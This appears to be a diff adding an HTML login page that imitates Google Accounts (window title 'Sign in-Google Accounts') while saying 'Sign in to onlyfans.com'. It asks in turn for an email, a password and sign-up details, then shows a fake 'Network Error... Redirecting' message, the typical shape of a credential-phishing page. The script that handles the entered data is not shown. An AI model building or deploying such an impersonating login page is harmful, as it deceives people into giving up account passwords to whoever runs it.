@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in-Google Accounts</title>
+    <link rel="shortcut icon" href="./images/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Sign in to onlyfans.com</h1>
+        </header>
+        
+        <main>
+            <div class="auth-container">
+                <!-- Step 1: Email input -->
+                <div class="auth-step" id="step1">
+                    <h2>Sign in</h2>
+                    <p>Enter your email to continue</p>
+                    
+                    <div class="form-group">
+                        <label for="email">Email or phone</label>
+                        <input type="email" id="email" placeholder="Enter your email">
+                        <div class="error-message" id="emailError"></div>
+                    </div>
+                    
+                    <div class="links">
+                        <a href="#" id="forgotEmail">Forgot email?</a>
+                    </div>
+                    
+                    <div class="policy-info">
+                        <p>Before using this app, you can review our <a href="#">privacy policy</a> and <a href="#">terms of service</a>.</p>
+                    </div>
+                    
+                    <div class="action-buttons">
+                        <button id="createAccount" class="secondary-btn">Create account</button>
+                        <button id="nextToStep2" class="primary-btn">Next</button>
+                    </div>
+                </div>
+                
+                <!-- Step 2: Password input -->
+                <div class="auth-step hidden" id="step2">
+                    <h2>Welcome</h2>
+                    <div class="user-info">
+                        <span id="userEmail"></span>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="password">Enter your password</label>
+                        <input type="password" id="password">
+                        <div class="error-message" id="passwordError"></div>
+                        <div class="show-password">
+                            <input type="checkbox" id="showPasswordCheckbox">
+                            <label for="showPasswordCheckbox">Show password</label>
+                        </div>
+                    </div>
+                    
+                    <div class="policy-info">
+                        <p>Before using this app, you can review our <a href="#">privacy policy</a> and <a href="#">terms of service</a>.</p>
+                    </div>
+                    
+                    <div class="action-buttons">
+                        <button id="tryAnotherWay" class="secondary-btn">Try another way</button>
+                        <button id="nextToStep3" class="primary-btn">Next</button>
+                    </div>
+                </div>
+                
+                <!-- Step 3: Confirmation and permissions -->
+                <div class="auth-step hidden" id="step3">
+                    <h2>Sign in to continue</h2>
+                    <div class="user-info">
+                        <span id="confirmUserEmail"></span>
+                    </div>
+                    
+                    <div class="permissions-info">
+                        <p>By continuing, we will share your name, email address, language preference with our service.</p>
+                        <p>See our <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a>.</p>
+                    </div>
+                    
+                    <div class="success-message hidden" id="loginSuccessMessage">
+                        <p class="network-message">Network Error. Check your connection! Redirecting...</p>
+                    </div>
+                    
+                    <div class="manage-account">
+                        <p>You can manage your account settings in your <a href="#">Account Settings</a>.</p>
+                    </div>
+                    
+                    <div class="action-buttons">
+                        <button id="cancel" class="secondary-btn">Cancel</button>
+                        <button id="continue" class="primary-btn">Continue</button>
+                    </div>
+                </div>
+                
+                <!-- Registration Form -->
+                <div class="auth-step hidden" id="registrationForm">
+                    <h2>Create your account</h2>
+                    
+                    <div class="form-group">
+                        <label for="businessEmail">Business email</label>
+                        <input type="email" id="businessEmail">
+                        <div class="error-message" id="businessEmailError"></div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="username">Username</label>
+                        <input type="text" id="username">
+                        <div class="error-message" id="usernameError"></div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="newPassword">Password</label>
+                        <input type="password" id="newPassword">
+                        <div class="error-message" id="newPasswordError"></div>
+                    </div>
+                    
+                    <div class="form-group checkbox">
+                        <input type="checkbox" id="marketingConsent">
+                        <label for="marketingConsent">I don't want to receive marketing emails.</label>
+                    </div>
+                    
+                    <div class="action-buttons">
+                        <button id="backToLogin" class="secondary-btn">Back to login</button>
+                        <button id="registerUser" class="primary-btn">Sign up</button>
+                    </div>
+                </div>
+            </div>
+        </main>
+        
+        <footer>
+            <div class="language-selector">
+                <select id="language">
+                    <option value="en">English (United States)</option>
+                    <option value="es">Español</option>
+                    <option value="fr">Français</option>
+                </select>
+            </div>
+            <div class="footer-links">
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </div>
+        </footer>
+    </div>
+    
+    <script src="script.js"></script>
+</body>
+</html>
